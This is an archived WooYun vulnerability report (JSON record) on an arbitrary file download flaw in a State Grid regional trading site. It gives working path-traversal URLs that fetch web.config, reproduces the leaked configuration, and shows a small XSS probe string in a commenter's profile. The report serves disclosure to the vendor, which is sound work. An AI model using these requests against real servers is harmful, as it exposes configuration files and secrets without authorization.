{"id": 7650, "wybug_id": "wooyun-2013-040898", "wybug_title": "国家电网某分站任意文件下载漏洞", "wybug_corp": "国家电网公司", "wybug_author": "xlz0iza1", "wybug_date": "2013-10-24 15:05", "wybug_open_date": "2013-12-08 15:06", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "任意文件读取", "文件操作参数未加过滤", "敏感信息泄漏", "任意文件遍历下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-08：\t细节向公众公开  简要描述： 国家电网某分站任意文件下载漏洞 详细说明：  #1：国家电网交易信息发布网站存在任意文件下载漏洞。网站地址：http://jyxx.ah.sgcc.com.cn#2:电力交易年报下载地址\n<a id=\"rptDljynb_ctl02_lbTitle\" class=\"content2\" href=\"javascript:__doPostBack('rptDljynb$ctl02$lbTitle','')\" onclick=\"javascript:window.location.href=&apos;DownPdf.aspx?name=2008_2009-08-30.pdf&apos;;return false;\"> … </a>\n#3：构建下载地址http://jyxx.ah.sgcc.com.cn/Downpdf.aspx?name=../../index.aspxhttp://jyxx.ah.sgcc.com.cn/Downpdf.aspx?name=../../web.config可以任意下载服务器上的文件夹。   漏洞证明：  Downpdf.aspx会自动把下载的文件后缀格式改成pdf只需该回来就可以了哦。\n\n\n\nweb.config配置文件信息\n<?xml version=\"1.0\"?><!--     注意: 除了手动编辑此文件以外，您还可以使用     Web 管理工具来配置应用程序的设置。可以使用 Visual Studio 中的     “网站”->“Asp.Net 配置”选项。    设置和注释的完整列表在     machine.config.comments 中，该文件通常位于     \\Windows\\Microsoft.Net\\Framework\\v2.x\\Config 中--><configuration>\t<connectionStrings>\t\t<add name=\"DataBaseKey\" connectionString=\"Data Source=test;Password=test;User ID=Test;Location=127.0.0.1;Port=3306;\"/>\t</connectionStrings>\t<system.web>\t\t<authentication mode=\"Forms\">\t\t\t<forms name=\".ASPXUSERDEMO\" loginUrl=\"login.aspx\" protection=\"All\" path=\"/\" timeout=\"60\"/>\t\t</authentication>\t\t<!--<authorization>\t\t\t<deny users=\"?\"/>\t\t</authorization>-->\t\t<globalization requestEncoding=\"UTF-8\" responseEncoding=\"UTF-8\"/>\t\t<compilation debug=\"true\">\t\t\t<assemblies>\t\t\t\t<add assembly=\"Microsoft.JScript, Version=8.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A\"/></assemblies></compilation>\t</system.web>\t<location path=\"Manage\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<deny users=\"?\"/>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"web/index.aspx\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<deny users=\"?\"/>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"web/nofile.asp\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<deny users=\"?\"/>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"web/frame_nofile.asp\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<deny users=\"?\"/>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"scdt.aspx\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<allow users=\"*\"></allow>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"MarketDetail.aspx\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<allow users=\"*\"></allow>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"dljynb.aspx\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<allow users=\"*\"></allow>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"tpxw.aspx\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<allow users=\"*\"></allow>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"DownPdf.aspx\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<allow users=\"*\"></allow>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"ImageNewsDetail.aspx\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<allow users=\"*\"></allow>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"documents\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<allow users=\"*\"></allow>\t\t\t</authorization>\t\t</system.web>\t</location>\t\t<location path=\"dwjgt.htm\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<allow users=\"*\"></allow>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"jyxx.htm\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<allow users=\"*\"></allow>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"scdt.htm\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<allow users=\"*\"></allow>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"jyzxjj.htm\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<allow users=\"*\"></allow>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"css.css\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<allow users=\"*\"></allow>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"flgc.htm\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<allow users=\"*\"></allow>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"yxqk.htm\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<allow users=\"*\"></allow>\t\t\t</authorization>\t\t</system.web>\t</location>\t<location path=\"images\">\t\t<system.web>\t\t\t<authorization>\t\t\t\t<allow users=\"*\"></allow>\t\t\t</authorization>\t\t</system.web>\t</location>\t<system.codedom>\t</system.codedom>\t<system.webServer>\t</system.webServer></configuration>\n   修复方案：  你懂的，今天没有冒泡了，出来冒下泡,嘎嘎！   版权声明：转载请注明来源 xlz0iza1@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-10-25 10:21 厂商回复： 谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-29 18:52 |    \t\txlz0iza1 \t\t\t( 普通白帽子  |\t\t\t        Rank:1027 漏洞数:207        | \"><script/src=data:,alert(1)%2b\")\t\t \n  @国家电网公司 礼物撒时候发啊.    \n     2013-10-31 15:32 |    \t\t国家电网公司(乌云厂商)\t\t \n  @xlz0iza1 尚在申请中。。。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}